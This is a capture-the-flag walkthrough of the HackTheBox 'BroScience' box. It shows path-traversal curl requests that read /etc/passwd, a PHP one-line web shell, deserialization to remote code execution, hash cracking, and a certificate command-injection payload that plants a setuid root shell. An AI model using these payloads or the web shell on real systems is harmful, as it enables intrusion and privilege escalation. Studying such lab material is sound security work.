## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Medium](Medium)
- Platform: [HTB

---

### 🔍 Recon

#### 🌐 Ports Discovered (via `nmap`):
- [**22/tcp** - OpenSSH 8.4p1 (Debian)](SSH)
- [**80/tcp** - Apache 2.4.54, redirects to HTTPS](HTTP)
- **443/tcp** - Apache 2.4.54 (SSL-enabled)

```bash
nmap -p- --min-rate 10000 10.10.11.195
nmap -p 22,80,443 -sCV 10.10.11.195
```

#### 🌍 Website Behavior
- HTTP redirects to HTTPS (`https://broscience.htb`)
- Exercises accessible via `exercise.php?id=1`
- Requires registration + activation
- PHPSESSID cookie issued

#### 🔍 Directory Fuzzing
```bash
feroxbuster -u https://broscience.htb -x php -k --no-recursion
```
- Interesting endpoints: `index.php`, `register.php`, `login.php`, `user.php`, `activate.php`, `includes/img.php`

---

### 🐚 Shell as www-data

#### 🕳️ Directory Traversal (not LFI 😤)
- `/includes/img.php?path=` is vulnerable
- `..%252f` double-URL encoding bypasses filters

```bash
curl -k "https://broscience.htb/includes/img.php?path=..%252f..%252f..%252fetc%252fpasswd"
```

#### 📄 Source Read
- Dumped `/index.php`, `/includes/utils.php`, `/includes/db_connect.php`
- Found DB creds & salt `NaCl`
- Found unserialize on `user-prefs` cookie
- Found insecure `generate_activation_code()` using `srand(time())`

#### 🔓 Activation Code Forge
```php
md5($db_salt . $password);
```
- Brute-forced likely activation code based on server timestamp
- Activated user

#### 💥 PHP Deserialization to RCE
- Modified `user-prefs` cookie with `AvatarInterface` payload
- Hosted reverse shell via `cmd.php`
- Reached `/cmd.php?cmd=...`
- Reverse shell as `www-data`

```php
<?php system($_REQUEST['cmd']); ?>
```

---

### 🐚 Shell as bill

#### 🔎 Database Creds
- Used creds from `db_connect.php` to connect to PostgreSQL
- Dumped users table and cracked password hashes with:
```bash
hashcat -m 20 --user hashes rockyou.txt --show
```
- Cracked user bill's password: `iluvhorsesandgym`
- Switched user via `su - bill`

---

### 👑 Shell as root

#### 🔄 Cron Discovery (pspy)
- Found `/opt/renew_cert.sh` executed every 2 mins
- Reads from `/home/bill/Certs/broscience.crt`
- Vulnerable to command injection via `CommonName` field

#### 💣 Exploit
- Crafted certificate with payload:
```bash
CN = $(cp /bin/bash /tmp/0xdf; chmod 4777 /tmp/0xdf)
```
- SetUID root shell dropped in `/tmp/0xdf`
- Executed `/tmp/0xdf -p` to get root

---

### 🏁 Flags
- **User:** `511395d5************************`
- **Root:** `e810aba4************************`

---

### 📬 Shoutout to 0xdf
- Blog: [0xdf hacks stuff](https://0xdf.gitlab.io/)
- Mastodon: `@0xdf@infosec.exchange`
- YouTube, Gitlab, Buy Me a Coffee ☕